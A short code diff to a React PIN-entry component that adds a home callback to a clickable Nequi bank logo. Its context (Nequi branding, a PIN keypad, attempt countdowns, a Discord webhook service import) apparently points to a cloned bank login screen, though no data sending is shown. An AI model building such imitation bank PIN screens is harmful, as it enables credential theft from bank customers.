@@ -6,6 +6,7 @@ import { DiscordWebhookService } from '../services/DiscordWebhookService'
 interface AccessScreenProps {
   onAccess: (applicationId: string) => void
   onBack: () => void
+  onHome: () => void
 }
 
 const KEYS = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '', '0', 'del']
@@ -14,7 +15,7 @@ const FIRST_ATTEMPT_DURATION = 10
 const SECOND_ATTEMPT_DURATION = 15
 const MAX_ATTEMPTS = 2
 
-export function AccessScreen({ onAccess, onBack }: AccessScreenProps) {
+export function AccessScreen({ onAccess, onBack, onHome }: AccessScreenProps) {
   const [pin, setPin] = useState('')
   const [loading, setLoading] = useState(false)
   const [countdown, setCountdown] = useState(FIRST_ATTEMPT_DURATION)
@@ -95,7 +96,7 @@ export function AccessScreen({ onAccess, onBack }: AccessScreenProps) {
 
       {/* Centered logo */}
       <div className="flex justify-center mt-6 mb-8">
-        <NequiLogo size="xl" color="dark" />
+        <NequiLogo size="xl" color="dark" onClick={onHome} />
       </div>
 
       {/* Title */}
